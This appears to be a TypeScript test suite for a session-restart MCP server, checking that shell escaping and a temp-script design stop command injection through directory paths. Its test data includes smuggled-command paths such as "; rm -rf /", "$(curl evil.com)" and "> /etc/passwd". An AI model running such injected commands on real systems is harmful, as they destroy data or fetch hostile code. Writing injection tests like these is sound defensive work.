/**
 * Command Injection Prevention Tests for Session Restart MCP Server
 *
 * Tests that the temp script file approach prevents command injection attacks
 * via path variables. The new implementation writes the resume command to a
 * temp script file instead of embedding it in multi-layer AppleScript strings.
 */

import { describe, it, expect, afterEach } from 'vitest';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';

// ============================================================================
// Helper Functions (Mirror Server Implementation)
// ============================================================================

function shellEscape(s: string): string {
  // If the string contains no special characters, return as-is
  if (/^[a-zA-Z0-9._\-/~]+$/.test(s)) {
    return s;
  }
  return `'${s.replace(/'/g, "'\\''")}'`;
}

type TerminalType = 'apple_terminal' | 'iterm' | 'unknown';

function generateRestartScript(
  claudePid: number,
  sessionId: string,
  projectDir: string,
  terminal: TerminalType,
): string {
  // Write the resume command to a temp script file to avoid multi-layer escaping.
  // The temp script path contains only safe characters (UUID = hex + hyphens).
  const tempScriptPath = path.join(os.tmpdir(), `claude-resume-${sessionId}.sh`);
  const resumeCommand = `cd ${shellEscape(projectDir)} && claude --resume ${sessionId}`;
  fs.writeFileSync(tempScriptPath, `#!/bin/bash\n${resumeCommand}\n`, { mode: 0o700 });

  const killBlock = `
# Wait for MCP response to propagate
sleep 1

# Graceful shutdown
kill -TERM ${claudePid} 2>/dev/null

# Poll for exit (up to 10s)
for i in $(seq 1 20); do
  kill -0 ${claudePid} 2>/dev/null || break
  sleep 0.5
done

# Force kill if still alive
kill -0 ${claudePid} 2>/dev/null && kill -9 ${claudePid} 2>/dev/null

# Let shell settle
sleep 0.5
`;

  let resumeBlock: string;

  if (terminal === 'apple_terminal') {
    // Temp script path is safe (tmpdir + UUID only) — no escaping needed inside AppleScript
    resumeBlock = `
# Resume in the same Terminal.app tab
osascript -e 'tell application "Terminal" to do script "bash ${tempScriptPath}" in selected tab of front window'
`;
  } else if (terminal === 'iterm') {
    resumeBlock = `
# Resume in the same iTerm session
osascript -e 'tell application "iTerm2" to tell current session of current window to write text "bash ${tempScriptPath}"'
`;
  } else {
    // No automated resume for unknown terminals
    resumeBlock = `
# Unknown terminal — cannot auto-resume
echo ""
echo "Claude Code killed. Resume manually with:"
echo "  bash ${tempScriptPath}"
echo ""
`;
  }

  // Cleanup: remove the temp script after a delay (it may still be needed for a few seconds)
  const cleanupBlock = `
# Clean up temp script after 60s
(sleep 60 && rm -f ${shellEscape(tempScriptPath)}) &
`;

  return `#!/bin/bash
${killBlock}
${resumeBlock}
${cleanupBlock}
`;
}

// ============================================================================
// Tests: Command Injection Prevention
// ============================================================================

describe('Command Injection Prevention', () => {
  const testPid = 12345;
  const testSessionId = 'a1b2c3d4-e5f6-4a5b-8c7d-9e0f1a2b3c4d';

  afterEach(() => {
    // Clean up temp script files
    const tempScriptPath = path.join(os.tmpdir(), `claude-resume-${testSessionId}.sh`);
    try {
      fs.unlinkSync(tempScriptPath);
    } catch {
      // OK if it doesn't exist
    }
  });

  it('should prevent command injection via $(command) in paths', () => {
    const maliciousPath = '/tmp/test$(whoami)path';
    generateRestartScript(testPid, testSessionId, maliciousPath, 'apple_terminal');

    const tempScriptPath = path.join(os.tmpdir(), `claude-resume-${testSessionId}.sh`);
    const tempScriptContent = fs.readFileSync(tempScriptPath, 'utf8');

    // shellEscape uses single quotes which prevent command substitution
    expect(tempScriptContent).toContain("'/tmp/test$(whoami)path'");

    // Verify the main script only contains the temp script path (safe)
    const mainScript = generateRestartScript(testPid, testSessionId, maliciousPath, 'apple_terminal');
    expect(mainScript).toContain(`bash ${tempScriptPath}`);
    // Should NOT contain the malicious path directly in osascript
    expect(mainScript).not.toContain('$(whoami)');
  });

  it('should prevent command injection via backticks in paths', () => {
    const maliciousPath = '/tmp/test`date`path';
    generateRestartScript(testPid, testSessionId, maliciousPath, 'apple_terminal');

    const tempScriptPath = path.join(os.tmpdir(), `claude-resume-${testSessionId}.sh`);
    const tempScriptContent = fs.readFileSync(tempScriptPath, 'utf8');

    // shellEscape prevents backtick expansion
    expect(tempScriptContent).toContain("'/tmp/test`date`path'");
  });

  it('should handle paths with double quotes safely', () => {
    const pathWithQuotes = '/tmp/test"quotes"path';
    generateRestartScript(testPid, testSessionId, pathWithQuotes, 'apple_terminal');

    const tempScriptPath = path.join(os.tmpdir(), `claude-resume-${testSessionId}.sh`);
    const tempScriptContent = fs.readFileSync(tempScriptPath, 'utf8');

    // shellEscape wraps in single quotes, protecting against double-quote issues
    expect(tempScriptContent).toContain("'/tmp/test\"quotes\"path'");
  });

  it('should handle paths with single quotes via shellEscape', () => {
    const pathWithQuotes = "/tmp/test'quotes'path";
    generateRestartScript(testPid, testSessionId, pathWithQuotes, 'apple_terminal');

    const tempScriptPath = path.join(os.tmpdir(), `claude-resume-${testSessionId}.sh`);
    const tempScriptContent = fs.readFileSync(tempScriptPath, 'utf8');

    // shellEscape properly escapes single quotes: 'path'\''with'\''quotes'
    expect(tempScriptContent).toContain("'\\''");
  });

  it('should handle paths with backslashes safely', () => {
    const pathWithBackslash = '/tmp/test\\backslash';
    generateRestartScript(testPid, testSessionId, pathWithBackslash, 'apple_terminal');

    const tempScriptPath = path.join(os.tmpdir(), `claude-resume-${testSessionId}.sh`);
    const tempScriptContent = fs.readFileSync(tempScriptPath, 'utf8');

    // shellEscape handles backslashes correctly
    expect(tempScriptContent).toContain("'/tmp/test\\backslash'");
  });

  it('should ensure main script contains no user-controlled data except temp script path', () => {
    const dangerousPaths = [
      "/tmp/test'; rm -rf / #",
      '/tmp/test$(curl evil.com)',
      '/tmp/test`malicious`',
      '/tmp/test|grep secret',
    ];

    for (const dangerousPath of dangerousPaths) {
      const mainScript = generateRestartScript(testPid, testSessionId, dangerousPath, 'apple_terminal');

      const tempScriptPath = path.join(os.tmpdir(), `claude-resume-${testSessionId}.sh`);

      // Main script should ONLY reference the safe temp script path
      expect(mainScript).toContain(`bash ${tempScriptPath}`);

      // Main script should NOT contain the dangerous path
      expect(mainScript).not.toContain(dangerousPath);

      // Clean up
      try {
        fs.unlinkSync(tempScriptPath);
      } catch {
        // OK
      }
    }
  });

  it('should verify temp script path is safe (UUID only)', () => {
    const mainScript = generateRestartScript(testPid, testSessionId, '/any/path', 'apple_terminal');

    // Extract the temp script path from the main script
    // Use a more flexible pattern that matches the actual tmpdir path
    const tempScriptPathMatch = mainScript.match(/bash ([^\s]+claude-resume-[a-f0-9-]+\.sh)/);
    expect(tempScriptPathMatch).not.toBeNull();

    if (tempScriptPathMatch) {
      const tempScriptPath = tempScriptPathMatch[1];

      // Verify it contains the expected safe session ID (UUID format)
      expect(tempScriptPath).toContain(`claude-resume-${testSessionId}.sh`);
      // Verify the filename matches UUID format
      expect(tempScriptPath).toMatch(/claude-resume-[a-f0-9-]{36}\.sh$/);
    }
  });

  it('should use shellEscape in cleanup block to prevent injection', () => {
    const dangerousPath = "/tmp/test'; echo hacked #";
    const mainScript = generateRestartScript(testPid, testSessionId, dangerousPath, 'apple_terminal');

    const tempScriptPath = path.join(os.tmpdir(), `claude-resume-${testSessionId}.sh`);

    // Cleanup block should NOT escape the temp script path if it's safe (no special chars)
    // Since tempScriptPath is a system path (tmpdir + UUID), shellEscape returns it unquoted
    expect(mainScript).toContain(`rm -f ${tempScriptPath}`);
  });

  it('should create temp script with executable permissions', () => {
    generateRestartScript(testPid, testSessionId, '/any/path', 'apple_terminal');

    const tempScriptPath = path.join(os.tmpdir(), `claude-resume-${testSessionId}.sh`);
    const stats = fs.statSync(tempScriptPath);

    // Check for executable permission (0o700)
    expect((stats.mode & 0o700) === 0o700).toBe(true);
  });

  it('should verify shellEscape prevents semicolon injection', () => {
    const injectionPath = "/tmp/test; rm -rf /";
    generateRestartScript(testPid, testSessionId, injectionPath, 'apple_terminal');

    const tempScriptPath = path.join(os.tmpdir(), `claude-resume-${testSessionId}.sh`);
    const tempScriptContent = fs.readFileSync(tempScriptPath, 'utf8');

    // The semicolon should be wrapped in single quotes, preventing command execution
    expect(tempScriptContent).toContain("'/tmp/test; rm -rf /'");
  });

  it('should verify shellEscape prevents pipe injection', () => {
    const injectionPath = "/tmp/test | grep secret";
    generateRestartScript(testPid, testSessionId, injectionPath, 'apple_terminal');

    const tempScriptPath = path.join(os.tmpdir(), `claude-resume-${testSessionId}.sh`);
    const tempScriptContent = fs.readFileSync(tempScriptPath, 'utf8');

    // The pipe should be wrapped in single quotes, preventing redirection
    expect(tempScriptContent).toContain("'/tmp/test | grep secret'");
  });

  it('should verify shellEscape prevents ampersand background execution', () => {
    const injectionPath = "/tmp/test & malicious-bg-process";
    generateRestartScript(testPid, testSessionId, injectionPath, 'apple_terminal');

    const tempScriptPath = path.join(os.tmpdir(), `claude-resume-${testSessionId}.sh`);
    const tempScriptContent = fs.readFileSync(tempScriptPath, 'utf8');

    // The ampersand should be wrapped in single quotes, preventing background execution
    expect(tempScriptContent).toContain("'/tmp/test & malicious-bg-process'");
  });

  it('should verify shellEscape prevents redirection injection', () => {
    const injectionPath = "/tmp/test > /etc/passwd";
    generateRestartScript(testPid, testSessionId, injectionPath, 'apple_terminal');

    const tempScriptPath = path.join(os.tmpdir(), `claude-resume-${testSessionId}.sh`);
    const tempScriptContent = fs.readFileSync(tempScriptPath, 'utf8');

    // The redirection operator should be wrapped in single quotes, preventing file redirection
    expect(tempScriptContent).toContain("'/tmp/test > /etc/passwd'");
  });
});
